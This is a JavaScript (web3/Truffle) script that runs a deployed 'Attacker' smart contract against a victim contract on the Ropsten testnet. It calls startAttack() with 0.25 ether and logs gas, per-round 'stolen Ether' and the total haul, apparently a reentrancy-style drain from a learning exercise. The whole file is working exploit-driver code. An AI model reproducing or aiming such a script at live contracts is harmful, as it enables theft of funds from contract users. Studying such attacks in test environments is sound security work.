const Web3 = require("web3");
const AttackerJSON = require("../build/contracts/Attacker.json");

const HDWalletProvider = require('@truffle/hdwallet-provider');
const fs = require('fs');
const mnemonic = fs.readFileSync("../.secret").toString().trim();
const infuraProjectID = fs.readFileSync("../.infuraProjectID").toString().trim();


const execute = async () => {
    //const provider = new Web3.providers.HttpProvider("http://localhost:9545");
    const provider = new HDWalletProvider(mnemonic, `https://ropsten.infura.io/v3/${infuraProjectID}`);
    const web3 = new Web3(provider);

    const accounts = await web3.eth.getAccounts();

    const networkID = await web3.eth.net.getId();
    const deployedNetwork = AttackerJSON.networks[networkID];

    const Attacker = new web3.eth.Contract(AttackerJSON.abi, deployedNetwork.address);

    const owner = await Attacker.methods.getOwner().call();
    const attackerBalance = await web3.eth.getBalance(deployedNetwork.address);
    const victimBalance = await Attacker.methods.getBalanceVictim().call();

    console.log("networkID: ", networkID);
    console.log("Attacker owner: ", owner);
    console.log("Attacker balance: ", attackerBalance, "[Wei]  || ", web3.utils.fromWei(attackerBalance, "ether"), "[Ether]");
    console.log("Victim balance: ", victimBalance, "[Wei]  || ", web3.utils.fromWei(victimBalance, "ether"), "[Ether]");

    console.log("STARTING ATTACK.\n");

    const txObj = await Attacker.methods.startAttack().send({from: accounts[0], value: web3.utils.toWei("0.25","ether"), gas: 5000000});

    console.log("STOPPED ATTACK.\n");
    console.log("Events during attack: ")
    console.log("------------------------------");
    for(let i=0; i<txObj.events.LogAttack.length; i++){
        console.log(`Round ${i}:`);

        console.log("  remainingGas: ", txObj.events.LogAttack[i].returnValues.remainingGas);
        console.log("  roundGasDifference: ", txObj.events.LogAttack[i].returnValues.roundGasDifference);
        console.log("  stolen Ether in this round: ", web3.utils.fromWei(txObj.events.LogFallbackFunction[i].returnValues.value, "ether"));
        console.log("  Attacker balance: ", web3.utils.fromWei(txObj.events.LogFallbackFunction[i].returnValues.attackerBalance, "ether"));
        console.log("  Victim balance: ", web3.utils.fromWei(txObj.events.LogFallbackFunction[i].returnValues.victimBalance, "ether"));
        console.log("------------------------------");
    }
    console.log("\nSUM OF STOLEN ETHER: ", web3.utils.fromWei(txObj.events.LogAttackHaul.returnValues.attackHaul, "ether"));
};

execute();